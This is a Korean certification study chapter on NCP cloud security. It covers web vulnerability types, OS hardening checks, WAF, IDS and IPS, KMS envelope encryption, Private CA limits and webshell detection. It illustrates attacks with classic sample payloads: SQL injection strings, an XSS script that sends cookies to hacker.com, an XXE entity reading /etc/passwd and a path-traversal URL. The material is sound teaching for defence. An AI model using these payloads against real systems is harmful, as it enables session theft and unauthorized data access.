---
title: "Chapter 23: 보안의 성벽 — 웹 취약점 & 보안 상품"
date: 2026-04-01 09:00:00 +0900
categories: [NCP, NCE]
tags: [ncp, nce, 자격증, security, waf, kms, private-ca, xss, sql-injection, ssrf, xxe]
description: "NCP NCE 자격증 대비 학습 자료 - 주요 웹 취약점과 NCP 보안 상품 정리"
---
> **학습 목표**: 웹 취약점 유형(SQL Injection/XSS/SSRF/XXE/파일업다운로드), 시스템 보안 점검 기준, KMS/Private CA/Webshell Detector의 작동 원리를 완벽히 이해한다.

---

## 이야기: 해킹 시도를 막아라

클라우드빵집 결제 시스템에 이상한 로그가 찍히기 시작했다.

```
GET /search?q='; DROP TABLE orders; --
```

민준이 식겁했다.

> "SQL Injection이야! 누군가 DB를 날리려 했어!"

재현이 침착하게 말했다.

> "WAF 설정해야 해. 그리고 Web Security Checker로 전체 취약점 스캔도 해보자."

---

## 🔑 핵심 개념 1: 웹 취약점 유형 (⭐⭐ 최빈출!)

### SQL Injection

```
[SQL Injection 공격]

정상 쿼리:
SELECT * FROM users WHERE id='user' AND pw='1234'

공격 입력: id = ' OR '1'='1
악성 쿼리:
SELECT * FROM users WHERE id='' OR '1'='1' AND pw=''
→ '1'='1'은 항상 참! 모든 계정 접근 가능!
```

- **입력값에 SQL 코드를 삽입**하여 DB를 조작
- 방어: 입력값 검증, Prepared Statement, WAF

### XSS (Cross-Site Scripting)

```
[XSS 공격]

악성 스크립트를 게시판에 등록:
<script>document.location='http://hacker.com/steal?cookie='+document.cookie</script>

다른 사용자가 해당 페이지를 열면
→ 스크립트 실행 → 쿠키 탈취!
```

- **악성 스크립트**를 웹페이지에 삽입, 다른 사용자 공격
- 방어: 출력 시 HTML 인코딩, CSP 헤더

### SSRF (Server-Side Request Forgery)

```
[SSRF 공격]

공격자 → 서버에 요청: "이 URL 정보 가져와줘"
          URL = http://internal-server/admin (내부 주소!)
서버 → 내부 서버에 요청 (방화벽 우회!)
→ 내부 메타데이터, 비공개 API 접근 가능
```

- **서버를 프록시로** 이용해 내부 리소스에 접근
- 클라우드 환경에서 특히 위험 (메타데이터 서버 접근)

### XXE (XML External Entity)

```
[XXE 공격]

악성 XML 전송:
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

→ 서버의 /etc/passwd 파일 내용이 응답에 포함됨!
```

- **XML 파서**의 외부 엔티티 처리 취약점
- 내부 파일 읽기, SSRF로 이어질 수 있음

### 파일 업로드/다운로드 취약점

```
[파일 업로드 공격]
악성 PHP 파일을 이미지로 위장하여 업로드
→ 웹쉘 업로드 → 서버 원격 제어!

[파일 다운로드 공격]
다운로드 URL 파라미터 조작:
/download?file=../../etc/passwd
→ 시스템 파일 다운로드!
```

---

## 🔑 핵심 개념 2: File Safer (파일 세이퍼)

**File Safer** = 업로드 파일의 **악성코드 자동 탐지** 서비스.

```
[File Safer 동작]

사용자 → 파일 업로드
    ↓
File Safer API 연동
    ↓
악성코드 여부 검사 (Hash 비교, 패턴 분석)
    ↓
정상 → 저장 허용
악성 → 차단 + 알림
```

- Object Storage 업로드 파일 자동 검사 가능
- API 연동으로 서비스에 통합

---

## 🔑 핵심 개념 3: Web Security Checker

**Web Security Checker** = 웹사이트의 **취약점 자동 스캔** 서비스.

### 점검 항목

| 취약점 | 설명 |
|--------|------|
| **SQL Injection** | DB 조작 가능한 입력값 취약점 |
| **XSS** | 악성 스크립트 삽입 취약점 |
| **SSRF** | 서버 측 요청 위조 |
| **XXE** | XML 외부 엔티티 취약점 |
| **파일 업로드** | 악성 파일 업로드 가능 여부 |
| **파일 다운로드** | 경로 탐색으로 파일 유출 가능 여부 |

---

## 🔑 핵심 개념 4: System Security Checker

**System Security Checker** = OS 보안 설정을 **자동으로 점검**하는 서비스.

### Linux 보안 설정 기준 (⭐ 빈출!)

```
[Linux 주요 파일 권한 설정]

/etc/shadow (패스워드 해시 파일)
→ 권한: 400 (소유자만 읽기)
→ 이유: 패스워드 해시 노출 방지

/etc/passwd (계정 정보 파일)
→ 권한: 644 (소유자 읽기+쓰기, 나머지 읽기)
→ 이유: 모든 사용자가 읽어야 하지만 수정 불가

UMASK 설정:
022 → 새 파일: 644 (rw-r--r--)
027 → 새 파일: 640 (rw-r-----)
→ 보안 강화 시 027 권장
```

| 항목 | 기준값 | 이유 |
|------|--------|------|
| `/etc/shadow` | **400** | 패스워드 해시 보호 |
| `/etc/passwd` | **644** | 읽기는 허용, 수정 불가 |
| **UMASK** | **022** 또는 **027** | 파일 기본 권한 |

### Windows 보안 설정 기준

| 항목 | 기준 |
|------|------|
| **비밀번호 정책** | 최소 길이, 복잡성, 만료 주기 |
| **인증 프로토콜** | **NTLMv2** 사용 (LM, NTLMv1 비활성화) |
| **감사 정책** | 로그인 성공/실패 감사 활성화 |
| **계정 잠금** | 일정 실패 횟수 후 잠금 |

> ⚠️ **시험 포인트**: Windows = **NTLMv2** 사용 권고!

---

## 🔑 핵심 개념 5: WAS Security Checker

**WAS Security Checker** = 웹 서버/WAS 설정 보안 점검.

| 점검 대상 | 주요 점검 항목 |
|---------|-------------|
| **Apache** | 디렉토리 목록 노출, 불필요한 모듈, 버전 노출 |
| **Tomcat** | 관리자 페이지 접근 제어, 에러 페이지 정보 노출 |
| **Nginx** | 서버 버전 노출, SSL 설정, 불필요한 HTTP 메소드 |

---

## 🔑 핵심 개념 6: 보안 장비 역할 구분 (⭐⭐ 최빈출!)

```
[보안 장비 배치]

인터넷
    ↓
[Firewall] ← 네트워크 패킷 허용/차단 (IP, Port 기반)
    ↓
[IDS] ← 침입 탐지 (감지만 함, 차단 안 함)
[IPS] ← 침입 방지 (탐지 + 차단)
    ↓
[WAF] ← 웹 애플리케이션 공격 차단 (HTTP/HTTPS, L7)
    ↓
웹 서버
```

| 장비 | 역할 | 계층 |
|------|------|------|
| **Firewall** | IP/Port 기반 패킷 필터링 | L3/L4 |
| **IDS** | 침입 **탐지** (알림만, 차단 X) | - |
| **IPS** | 침입 **탐지 + 차단** | - |
| **WAF** | 웹 공격 차단 (SQL Injection, XSS 등) | L7 |

> ⚠️ **IDS vs IPS**: IDS = 탐지만 / IPS = 탐지 + 차단

---

## 🔑 핵심 개념 7: KMS (Key Management Service) (⭐⭐)

**KMS** = 암호화 키를 안전하게 생성, 저장, 관리하는 서비스.

### 봉투 암호화 (Envelope Encryption)

```
[Envelope Encryption 구조]

Root Key (NCP 관리, 절대 외부 노출 X)
    ↓ 암호화
Master Key (Customer Master Key - CMK)
    ↓ 암호화
Data Key (실제 데이터 암호화에 사용)
    ↓ 암호화
실제 데이터 (Data)
```

| 키 종류 | 관리 주체 | 역할 |
|--------|---------|------|
| **Root Key** | NCP 관리 | 최상위 키, 외부 노출 절대 불가 |
| **Master Key (CMK)** | 고객 생성 | Data Key 암호화 |
| **Data Key** | 자동 생성 | 실제 데이터 암호화 |

> ⚠️ **봉투 암호화**: 키를 키로 암호화하는 중첩 구조!

---

## 🔑 핵심 개념 8: Certificate Manager & Private CA

### Certificate Manager (인증서 관리)

| 기능 | 내용 |
|------|------|
| **자동 갱신** | 인증서 만료 전 자동 갱신 |
| **NCP 서비스 연동** | LB, CDN에 인증서 직접 연결 |
| **무료 발급** | Let's Encrypt 연동 무료 인증서 |

### Private CA (사설 인증기관)

```
[Private CA 구조]

Root CA
    └─ Intermediate CA 1
        └─ End Entity 인증서 (서버 인증서)
    └─ Intermediate CA 2
        └─ End Entity 인증서
```

| 항목 | 제한 |
|------|------|
| **최대 CA 수** | **10개** |
| **최대 인증서 발급 수** | **30,000개** |

> Private CA = 사내 내부 서비스용 인증서 발급 (공인 CA 비용 절감)

---

## 🔑 핵심 개념 9: Webshell Behavior Detector (⭐)

**Webshell Behavior Detector** = 서버에 설치된 웹쉘(악성 스크립트)을 탐지.

```
[Webshell 공격 시나리오]

공격자 → 파일 업로드 취약점 이용
→ shell.php 업로드 성공
→ http://victim.com/uploads/shell.php 접근
→ 서버에서 명령어 실행 가능! (원격 제어)
```

### 탐지 방식

| 탐지 방식 | 설명 |
|---------|------|
| **에이전트 기반** | 서버에 Agent 설치 |
| **행위 기반** | 패턴이 아닌 **비정상 행동** 탐지 |
| **실시간 탐지** | 웹쉘 실행 즉시 감지 |

> ⚠️ **시험 포인트**: 
> - 에이전트 기반 (**Agent** 설치 필요)
> - **행위(Behavior) 기반** 탐지 (패턴 매칭 X)

---

## 📝 시험 대비 체크리스트

**웹 취약점:**
- [ ] SQL Injection: DB 조작 (입력값에 SQL 삽입)
- [ ] XSS: 스크립트 삽입 → 쿠키 탈취
- [ ] SSRF: 서버를 프록시로 내부 접근
- [ ] XXE: XML 외부 엔티티로 파일 읽기

**System Security:**
- [ ] `/etc/shadow` 권한: **400**
- [ ] `/etc/passwd` 권한: **644**
- [ ] Windows: **NTLMv2** 사용 권고

**보안 장비:**
- [ ] Firewall: IP/Port 패킷 필터
- [ ] **IDS**: 탐지만 (차단 X)
- [ ] **IPS**: 탐지 + 차단
- [ ] WAF: 웹 공격 차단 (L7)

**KMS:**
- [ ] 봉투 암호화: Root Key → Master Key → Data Key
- [ ] Root Key: NCP 관리, 외부 노출 불가

**Private CA:**
- [ ] 최대 CA: **10개**
- [ ] 최대 인증서: **30,000개**

**Webshell Detector:**
- [ ] Agent 기반 설치
- [ ] **행위(Behavior) 기반** 탐지

---

## 🧠 암기 핵심 문장

> "**IDS = 탐지만 / IPS = 탐지+차단 / WAF = 웹공격(L7)**"  
> "**KMS = 봉투암호화: Root→Master→Data Key**"  
> "**Private CA: 최대 10개 CA, 30,000개 인증서**"  
> "**Webshell Detector = Agent 설치 + 행위 기반**"  
> "**/etc/shadow=400, /etc/passwd=644, Windows=NTLMv2**"

---

*다음 챕터: `99_총정리_시험직전체크리스트.md` → 전체 핵심 숫자 총정리*
